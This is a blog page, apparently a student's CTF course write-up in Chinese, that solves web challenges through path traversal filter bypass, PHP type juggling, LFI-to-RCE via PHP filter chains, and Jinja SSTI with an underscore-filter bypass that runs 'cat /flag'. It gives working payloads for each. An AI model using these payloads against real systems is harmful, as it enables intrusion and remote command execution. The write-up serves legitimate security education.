@@ -1,0 +1,282 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>【網路安全實務與社會實踐】作業二 Write-up | OWL_D Blog</title>
+    <meta name="author" content="owl_d" />
+    <meta name="description" content="專注於網絡安全、滲透測試和技術分享的技術部落格" />
+    <meta name="keywords" content="網絡安全, 滲透測試, CTF, 技術分享, 資安" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>OWL_D BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;OWL_D BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>【網路安全實務與社會實踐】作業二 Write-up</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/26
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #00bcd4">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/CyberSecurity/" style="color: #ff7d73">
+                    CyberSecurity
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/NCKUCTF/" style="color: #00a596">
+                    NCKUCTF
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="作業二-Write-up-by-owl-d"><a href="#作業二-Write-up-by-owl-d" class="headerlink" title="作業二 Write-up by owl_d"></a>作業二 Write-up by owl_d</h1><h3 id="pathwalker-waf2"><a href="#pathwalker-waf2" class="headerlink" title="pathwalker-waf2"></a>pathwalker-waf2</h3><p>發現這題的path traversal重點在這個區間</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">        $safe_path = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $_GET[&#x27;page&#x27;]);</span><br><span class="line">        echo file_get_contents(&quot;./page/&quot;.$safe_path.&quot;.php&quot;);</span><br><span class="line">      &#125;      </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>程式只有把 ..&#x2F; 換掉<br>所以可以使用 …&#x2F;.&#x2F; 的方式來 bypass<br>…&#x2F;.&#x2F; 被換掉後會變成 ..&#x2F; 就一樣可以達成回到上一層的目的</p>
+<p><code>https://chall.nckuctf.org:28142/?page=..././..././..././..././var/www/html/flag</code><br>即取得flag</p>
+<p>p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ..&#x2F; 過濾掉</p>
+<h3 id="swirl"><a href="#swirl" class="headerlink" title="swirl"></a>swirl</h3><p>Stage 1: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">echo &#x27;&lt;h1&gt;👻 Stage 1 / 4&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A != $B)</span><br><span class="line">        if (strcmp($A, $B) == 0)</span><br><span class="line">            if (md5($A) === md5($B))</span><br><span class="line">                echo &quot;&lt;a href=$stage2&gt;Go to stage2&lt;/a&gt;&quot;;</span><br><span class="line">            else die(&#x27;ERROR: MD5(A) != MD5(B)&#x27;);</span><br><span class="line">        else die(&#x27;ERROR: strcmp(A, B) != 0&#x27;);</span><br><span class="line">    else die(&#x27;ERROR: A == B&#x27;);</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
+<p>弱型態比較，可以使用 md5(array型態) &#x3D; NULL 的性質來達成<br>payload: <code>?A[]=1&amp;B[]=2</code></p>
+<p>Stage 2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">echo &#x27;&lt;h1&gt;👻 Stage 2 / 4&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A !== $B)&#123;</span><br><span class="line">        $is_same = md5($A) == 0 and md5($B) === 0;</span><br><span class="line">        if ($is_same)</span><br><span class="line">            echo (md5($B) ? &quot;QQ1&quot; : md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;);</span><br><span class="line">        else die(&#x27;ERROR: $is_same is false&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
+<p>關鍵點應該在這：<br><code>md5($B) ? &quot;QQ1&quot; : md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;</code><br>看起來有點複雜，但我們可以一部分一部分拆開來看<br><code>md5($B) ? &quot;QQ1&quot; : (目標要到這邊)</code><br>可以看出來 b 必須得是 false，才能繼續往下<br>進到下一層後，<br><code>md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;</code><br>所以 md5($A) 必須得是0<br>整理一下條件：</p>
+<ol>
+<li>A 和 B 的值必須不同</li>
+<li>md5(A) 和 md5(B) 都必須等於 0</li>
+<li>md5(B) 必須為假值</li>
+</ol>
+<p>payload: <code>?A[]=1&amp;B[]=2</code></p>
+<p>有趣的事：<br>意外發現 payload: <code>?A=true&amp;B=false</code> 也行得通<br>可是我自己做了實驗<br><img src="https://hackmd.io/_uploads/rJX2pUxTJg.png" alt="image"><br>發現程式根本就應該跳到 QQ1 就算 QQ1 被調過了應該也要跳去 QQ2<br>到現在我還是不懂是什麼神奇的機制繞過的，我再研究看看</p>
+<p>Stage 3:<br>.. 會變成 .<br>那 …. 就會變成 .. 了！<br>payload: <code>....\config.php</code><br>(記得要打開網頁原始碼看！)<br><img src="https://hackmd.io/_uploads/Hkv_1tA31e.png" alt="image"></p>
+<p>Stage 4:<br>寫完這題發現 LCI 轉 RCE 真的是天才般的發現，太神了<br>先觀察題目source，會發現主要漏洞在：</p>
+<ol>
+<li>使用了 extract($_POST) 函數，直接將 POST 請求中的參數轉換為變數</li>
+<li>未經過濾的 include($👀) 語句，允許包含任意文件</li>
+</ol>
+<p>所以先試了一下 POST 👀&#x3D;&#x2F;etc&#x2F;passwd：<br>發現真的有回傳內容，代表 LFI 行得通<br><img src="https://hackmd.io/_uploads/B1P8D8gpkg.png" alt="image"></p>
+<p>可是 👀&#x3D;&#x2F;flag 或者  👀&#x3D;..&#x2F;..&#x2F;..&#x2F;flag.php 等等直接取 flag 的方式全部失敗<br>所以勢必得要 RCE 才能印出 flag 了</p>
+<p>這次攻擊主要採用 PHP filter chain 來達成<br><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md">https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md</a><br>指令：<code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /flag*&#39;); ?&gt;&quot;</code><br>送到 POST 的 👀 後面變取得 flag</p>
+<p>p.s. 最後我還用了 <code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;ls /&#39;); ?&gt;&quot;</code><br>回頭再看一下爲什麼當初試了快 5 個小時的 ..&#x2F;..&#x2F;flag.php 不管用<br>最後也看到了 flag 檔案有加後綴，所以 path traversal 其實不管用<br><img src="https://hackmd.io/_uploads/S1r4DUe6yx.png" alt="image"></p>
+<h3 id="SSTI-waf1"><a href="#SSTI-waf1" class="headerlink" title="SSTI-waf1"></a>SSTI-waf1</h3><p>一開始先送送看 49 發現真的回應 49<br>那肯定得是個 SSTI 了！</p>
+<p><img src="https://hackmd.io/_uploads/B1xZc0yT1x.png" alt="image"><br>從source發現題目會擋掉 _ 底線<br>所以把底線用 <code>\5f</code> 來繞過<br>並且用 <code>attr</code> 代替 點 來做串接</p>
+<p>一開始先用ls &#x2F; 看根目錄有沒有值得注意的檔案<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls /')|attr('read')() &#125;&#125;</code><br>發現網頁回應：<br><img src="https://hackmd.io/_uploads/Sk3ycRJ6kx.png" alt="image"></p>
+<p>有 flag 檔案，cat 一下便可以得到解答<br>payload:<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() &#125;&#125;</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 OWL_D Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;owl_d
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
